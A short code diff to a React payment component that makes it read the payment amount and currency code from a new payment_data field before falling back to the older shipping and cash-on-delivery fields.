@@ -40,9 +40,10 @@ const PaymentBankSelector = () => {
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
+  const paymentData = shippingInfo?.payment_data;
 
-  // Get amount from link data - prioritize saved amount
-  const rawAmount = shippingInfo?.payment_amount || shippingInfo?.cod_amount;
+  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
+  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -57,8 +58,8 @@ const PaymentBankSelector = () => {
     }
   }
 
-  // Get saved currency code
-  const currencyCode = shippingInfo?.currency_code || countryData?.currency || "SAR";
+  // Get saved currency code from payment_data or shipping info
+  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
   const formattedAmount = formatCurrency(amount, currencyCode);
   
   // Load banks when country is available from link data
